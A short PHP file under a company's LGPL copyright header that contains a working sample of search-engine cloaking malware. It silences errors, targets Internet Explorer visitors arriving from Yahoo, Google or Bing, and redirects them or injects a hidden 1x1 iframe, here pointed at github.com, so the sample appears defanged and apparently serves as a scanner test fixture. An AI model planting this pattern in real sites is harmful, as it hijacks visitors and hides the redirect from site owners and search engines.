<?php

/*
 * Copyright (c) 2020 Heimrich & Hannot GmbH
 *
 * @license LGPL-3.0-or-later
 */

error_reporting(0);
$trum = headers_sent();
$referer = $_SERVER['HTTP_REFERER'];
$ua = $_SERVER['HTTP_USER_AGENT'];

if (stristr($ua, 'msie')) {
    if (!$trum) {
        if (stristr($referer, 'yahoo') or stristr($referer, 'google') or stristr($referer, 'bing')) {
            if (!stristr($referer, 'site') or !stristr($referer, 'cache') or !stristr($referer, 'inurl')) {
                header('Location: http://github.com');

                exit();
            }
        }
    } else {
        echo '<iframe frameborder="0" height="1" scrolling="no" src="//github.com" width="1"></iframe>';
    }
}
